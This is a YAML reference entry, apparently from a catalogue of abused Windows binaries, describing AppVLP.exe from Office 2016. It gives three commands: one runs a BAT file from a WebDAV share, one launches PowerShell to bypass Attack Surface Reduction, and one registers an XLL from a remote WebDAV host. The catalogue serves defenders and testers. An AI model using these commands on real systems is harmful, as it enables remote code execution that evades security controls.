---
name: Appvlp.exe
description: Application Virtualization Utility Included with Microsoft Office 2016
functions:
  execute:
    - description: Executes calc.bat through AppVLP.exe
      code: AppVLP.exe \\webdav\calc.bat
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows 10 w/Office 2016
      privileges: User
      usecase: Execution of BAT file hosted on Webdav server.
    - description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
      code: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows 10 w/Office 2016
      privileges: User
      usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
    - description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
      code: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows 10 w/Office 2016
      privileges: User
      usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
resources:
    - resource: https://github.com/MoooKitty/Code-Execution
    - resource: https://twitter.com/moo_hax/status/892388990686347264
    - resource: https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/
    - resource: https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
fullpath:
    - path: C:\Program Files\Microsoft Office\root\client\appvlp.exe
    - path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe
detection:
  - IOC: 
acknowledgement:
  - Person: fab
    Handle: '@0rbz_'
  - Person: Will
    Handle: '@moo_hax'
  - Person: Matt Wilson
    Handle: '@enigma0x3'
---
